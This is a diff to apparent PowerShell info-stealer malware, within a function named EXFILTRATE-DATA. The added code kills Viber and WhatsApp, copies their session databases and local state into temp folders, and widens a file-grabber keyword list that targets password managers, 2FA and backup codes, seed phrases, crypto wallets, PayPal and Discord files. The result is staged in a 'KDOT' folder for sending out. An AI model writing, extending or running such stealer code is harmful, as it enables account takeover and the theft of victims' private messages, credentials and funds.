@@ -128,6 +128,45 @@ function EXFILTRATE-DATA {
         Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
     }
     signalstealer 
+	
+	# Viber Session Stealer
+    function viberstealer {
+            $processname = "viber"
+            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+            $viber_session = "$messaging_sessions\Viber"
+            New-Item -ItemType Directory -Force -Path $viber_session
+            $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
+            $configfiles = @("config$1")
+            foreach($file in $configfiles) {
+                Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $viber_session }
+            }
+    		$pattern = "^([\+|0-9 ][ 0-9.]{1,12})$"
+            $directories = Get-ChildItem -Path $viberFolder -Directory | Where-Object { $_.Name -match $pattern }
+            foreach ($directory in $directories) {
+                $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
+                Copy-Item -Path $directory.FullName -Destination $destinationPath -Force
+            }
+            $files = Get-ChildItem -Path $viberFolder -File -Recurse -Include "*.db", "*.db-shm", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
+                foreach ($file in $files) {
+                    $parentFolder = Split-Path -Path $file.FullName -Parent
+                    $phoneNumberFolder = Get-ChildItem -Path $parentFolder -Directory | Where-Object { $_.Name -match $pattern}
+                    if (-not $phoneNumberFolder) {
+                        Copy-Item -Path $file.FullName -Destination $destinationPath
+                 }
+           }
+    }
+    viberstealer 
+	
+	# Whatsapp Session Stealer
+    function whatsappstealer {
+            $processname = "whatsapp"
+            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
+            $whatsapp_session = "$messaging_sessions\Whatsapp"
+            New-Item -ItemType Directory -Force -Path $whatsapp_session
+            $whatsappfolder = "$env:localappdata\Packages\5319275A.WhatsAppDesktop_cv1g1gvanyjgm"
+            Copy-Item -Path "$whatsappfolder\LocalState" -Destination $whatsapp_session -Recurse -force
+    }
+    whatsappstealer
 
     # All Gaming Sessions
     New-Item -Path "$env:localappdata\Temp" -Name "Gaming Sessions" -ItemType Directory -force | out-null
@@ -251,7 +290,6 @@ function EXFILTRATE-DATA {
     New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
     $crypto = "$env:localappdata\Temp\Crypto Wallets"
     
-    
     New-Item -Path "$env:localappdata\Temp" -Name "Email Clients" -ItemType Directory -force | out-null
     $emailclientsfolder = "$env:localappdata\Temp\Email Clients"
     
@@ -328,36 +366,46 @@ function EXFILTRATE-DATA {
     $filegrabber = "$env:localappdata\Temp\Files Grabber"
     Function GrabFiles {
         $grabber = @(
+            "2fa",
+            "acc",
             "account",
-            "login",
-            "metamask",
-            "crypto",
+            "backup",
+            "backupcode",
+            "bitwarden",
             "code",
             "coinbase",
+            "crypto",
+            "dashlane",
+            "default",
+            "discord",
+            "disk",
+            "eth",
             "exodus",
-            "backupcode",
-            "token",
-            "seedphrase",
+            "facebook",
+            "fb",
+            "keepass",
+            "keepassx",
+            "keepassxc",
+            "keys",
+            "lastpass",
+            "login",
+            "login",
+            "mail",
+            "memo",
+            "metamask",
+            "nordpass",
+            "pass",
+            "paypal",
             "private",
             "pw",
-            "lastpass",
-            "keepassx",
-            "keepass",
-            "keepassxc",
-            "nordpass",
-            "syncthing",
-            "dashlane",
-            "bitwarden",
-            "memo",
-            "keys",
-            "secret",
             "recovery",
-            "2fa",
-            "pass",
-            "login",
-            "backup",
-            "discord",
-            "paypal",
+            "remote",
+            "secret",
+            "seedphrase",
+            "server",
+            "syncthing",
+            "token",
+            "wal",
             "wallet"
         )
         $dest = "$env:localappdata\Temp\Files Grabber"
@@ -493,7 +541,6 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$emailclientsfolder" -Destination "$extracted\KDOT" 
     
     # Don't send null data
-    
     Get-ChildItem -Path "$extracted\KDOT" -File | ForEach-Object {
         $_.Attributes = $_.Attributes -band (-bnot [System.IO.FileAttributes]::ReadOnly)
     }
